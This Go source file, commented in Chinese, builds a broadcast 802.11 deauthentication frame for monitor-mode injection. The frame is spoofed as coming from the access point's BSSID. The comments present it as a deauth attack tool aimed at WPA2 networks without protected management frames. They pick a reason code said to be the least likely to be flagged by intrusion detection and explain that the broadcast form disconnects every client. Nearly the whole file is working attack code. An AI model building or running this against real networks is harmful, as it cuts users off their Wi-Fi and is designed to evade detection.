// Package ieee80211 负责 802.11 帧的纯字节编解码，不处理任何系统交互。
//
// 802.11 管理帧格式自 1997 年首版标准以来保持稳定，deauthentication 帧
// 在全部 PHY 代际中具有完全相同的字节布局：
//
//	802.11   (1997, 2.4GHz, 1-2 Mbps, FHSS/DSSS)
//	802.11b  (1999, 2.4GHz, 11 Mbps, DSSS/CCK)
//	802.11a  (1999, 5GHz,   54 Mbps, OFDM)
//	802.11g  (2003, 2.4GHz, 54 Mbps, OFDM)
//	802.11n  (2009, 2.4/5GHz, HT,  MIMO, 600 Mbps)
//	802.11ac (2013, 5GHz,   VHT, MU-MIMO, ~3.5 Gbps)
//	802.11ax (2019, 2.4/5GHz; 2021 WiFi 6E 扩展至 6GHz, HE, OFDMA)
//	802.11be (2024, 2.4/5/6GHz, EHT, 320MHz, MLO, WiFi 7)
//
// 差异只在物理层（调制、带宽、MIMO 与频段），管理帧的 MAC 头格式不变。
// 真正影响 deauth 有效性的是 802.11w（PMF, Protected Management Frames）：
// WPA3 与 6GHz 频段强制启用 PMF，未认证广播 deauth 会被客户端直接丢弃；
// 2.4/5GHz 的 WPA2 网络普遍不启用 PMF，是本工具的主要作用面。
package ieee80211

import (
	"errors"
	"net"
)

const (
	// Radiotap 头部长度：version(1) + pad(1) + length(2) + it_present(4)。
	// 不携带任何扩展字段时最小即 8 字节，注入驱动按当前信道/速率发送。
	radiotapHeaderLen = 8

	// 802.11 管理帧 MAC 头部长度：
	// Frame Control(2) + Duration(2) + Addr1(6) + Addr2(6) + Addr3(6) + SeqCtl(2)。
	macHeaderLen = 24

	// deauthentication 帧体长度：仅 Reason Code 一个字段（uint16 小端）。
	reasonCodeLen = 2

	// DeauthFrameLen 是完整注入帧长度：Radiotap(8) + MAC头(24) + Reason(2)。
	DeauthFrameLen = radiotapHeaderLen + macHeaderLen + reasonCodeLen
)

const (
	// frameTypeManagement 是 802.11 帧类型字段中的管理帧取值（bit 2-3 = 00）。
	frameTypeManagement = 0

	// subtypeDeauth 是管理帧子类型字段中的 deauthentication 取值（bit 4-7 = 1100）。
	// Frame Control 第一字节 = subtype<<4 | type<<2 | version = 0xC0。
	subtypeDeauth = 12
)

// deauth 帧使用的 Reason Code（802.11 标准 §9.4.1.7 定义）。
const (
	// ReasonClass3FromNonAssoc = 7，表示“收到来自未关联 STA 的 Class 3 帧”。
	// 客户端收到携带该值的 deauth 后会认为自身关联状态已失效，从而主动断开。
	// 这是 deauth 攻击中最常用且最不容易被入侵检测标异的合法原因码。
	ReasonClass3FromNonAssoc uint16 = 7
)

// BuildDeauthFrame 构造广播 802.11 deauthentication 管理帧。
// 返回帧长度为 DeauthFrameLen（34 字节），可直接经 monitor 接口注入空中：
// Linux/Android 使用 AF_PACKET，Windows 使用 Npcap 的 pcap_sendpacket。
//
// 广播地址（addr1=ff:ff:ff:ff:ff:ff）让 AP 下所有关联客户端同时失效；
// WPA3/6GHz 网络因 PMF 强制启用会丢弃该帧，属协议层面的固有约束。
func BuildDeauthFrame(bssid net.HardwareAddr) ([]byte, error) {
	// 地址必须是 6 字节，额外校验防止 net.ParseMAC 以外的非法输入。
	if len(bssid) != 6 {
		return nil, errors.New("BSSID 长度错误，必须为 6 字节 MAC 地址")
	}

	frame := make([]byte, DeauthFrameLen)

	// Radiotap 最小头：仅声明自身长度为 8，不携带任何字段。
	// 对大多数注入驱动而言，这已足以让芯片按当前信道/速率发送。
	frame[0] = 0x00 // version
	frame[1] = 0x00 // pad
	frame[2] = radiotapHeaderLen
	frame[3] = 0x00 // length 高字节（小端）
	// frame[4..7] it_present 位图全 0，表示不携带任何扩展字段

	// Frame Control：version(0) | type(management) | subtype(deauth)。
	// 低字节 bit 4-7 放子类型 12（0xC），bit 2-3 放类型 0，故为 0xC0；
	// 高字节为 Flags（toDS/fromDS/protected/order 等），deauth 全清 0。
	frame[8] = byte(subtypeDeauth<<4 | frameTypeManagement<<2)
	frame[9] = 0x00

	// Duration：注入场景下无 NAV 预留需求，置 0。
	frame[10] = 0x00
	frame[11] = 0x00

	// addr1（Receiver/Destination）：广播地址，AP 下所有关联客户端均处理。
	for i := 0; i < 6; i++ {
		frame[12+i] = 0xff
	}

	// addr2（Transmitter/Source）= BSSID：伪装成 AP 自己发出。
	copy(frame[18:24], bssid)

	// addr3（BSS Identifier）= BSSID：标识该帧所属的 BSS。
	copy(frame[24:30], bssid)

	// Sequence Control：置 0 占位，网卡芯片发送时按自身序列计数器填充。
	frame[30] = 0x00
	frame[31] = 0x00

	// Reason Code：uint16 小端置于帧尾。
	frame[32] = byte(ReasonClass3FromNonAssoc)
	frame[33] = byte(ReasonClass3FromNonAssoc >> 8)

	return frame, nil
}
